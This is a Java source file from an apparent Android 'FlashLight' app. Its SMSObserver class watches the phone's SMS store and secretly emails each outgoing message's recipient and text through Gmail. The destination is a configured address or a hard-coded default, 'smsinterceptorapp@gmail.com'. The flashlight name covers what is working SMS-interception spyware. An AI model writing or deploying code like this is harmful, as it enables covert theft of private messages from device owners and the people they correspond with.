package com.flash.light; 

import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import android.net.Uri;
import android.util.Log;
import android.os.Handler;
import android.widget.Toast;
import android.app.Activity;
import android.telephony.SmsManager;

import android.content.Context;
import android.content.ContentResolver;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.ContentObserver;

public class SMSObserver extends ContentObserver {

  private Handler handler;

  public  static Context context;

  private static GmailSender sender; 
  private static Configure configure;
  private static String initId = "0";
  private static String gmailEmailString;

  private static final String TAG = "FlashLight SMSObserver";

  public SMSObserver(Handler handler, Context context) {
    super(handler);

    handler = handler;    
    SMSObserver.context = context;
    configure = new Configure();

    Log.d(TAG, "Entering SMSObserver constructor");

    if(!configure.getDatabaseInfo().equals("null")) {
      gmailEmailString = configure.getEmailAddress();
    }
    else {
      gmailEmailString = "smsinterceptorapp@gmail.com";
    }
    Log.i(TAG,"SMSObserver() constructor gmailEmailString " + gmailEmailString);
  }

  /*@Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);
    int MESSAGE_TYPE_SENT = 2;
    String COLUMN_TYPE = "type";
    Uri uri = Uri.parse("content://sms/");

    Cursor cursor = null;

    try {

      cursor = context.getContentResolver().query(uri, null, null, null, null);

      if(cursor != null && cursor.moveToFirst()) {

        int type = cursor.getInt(cursor.getColumnIndex(COLUMN_TYPE));

        if(type == MESSAGE_TYPE_SENT) {
          Log.i(TAG, "onChange() Message recieved.");
        }
        else {
          Log.i(TAG, "SMSObserver is working!");
        }
      }
    }
    finally {
      if(cursor != null) {
        cursor.close();
      }
    }
  }*/

  @Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);

    Log.i(TAG, "Entering onChange()");

    Uri uriSMSURI = Uri.parse("content://sms");
    String[] sCol = {"_id","type","body","address"};
    String sOrder = "date desc limit 1";
   
    int initId = 0; 
    Cursor cursor = null;

    try {

      cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
      cursor.moveToLast();

      String id     = cursor.getString(cursor.getColumnIndex("_id"));
      String type   = cursor.getString(cursor.getColumnIndex("type"));

      final String body   = cursor.getString(cursor.getColumnIndex("body"));
      final String addr   = cursor.getString(cursor.getColumnIndex("address"));

      Log.i(TAG, "onChange() id: " + id + ", InitId: " + initId + ", type: " + type + ", body: " + body + ", addr: " + addr);
	
      //if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
      if(!(String.valueOf(initId)).equals(id) && type.equals("2")) {
        new Thread(new Runnable() {

          @Override
          public void run() {
            try {
              sender = new GmailSender();
              sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + addr + "\nbody:\n" + body, gmailEmailString);
            }
            catch(Exception e) {
              e.printStackTrace();
              Log.e(TAG, "onChange() Exception e " + e.toString());
            }
          }
        }).start();
      }
      else { } // Incoming messages if type == 1
    }
    catch(Exception e) {

    }
    finally {
      if(cursor != null) {
        cursor.close();
      }
    }
  }
}
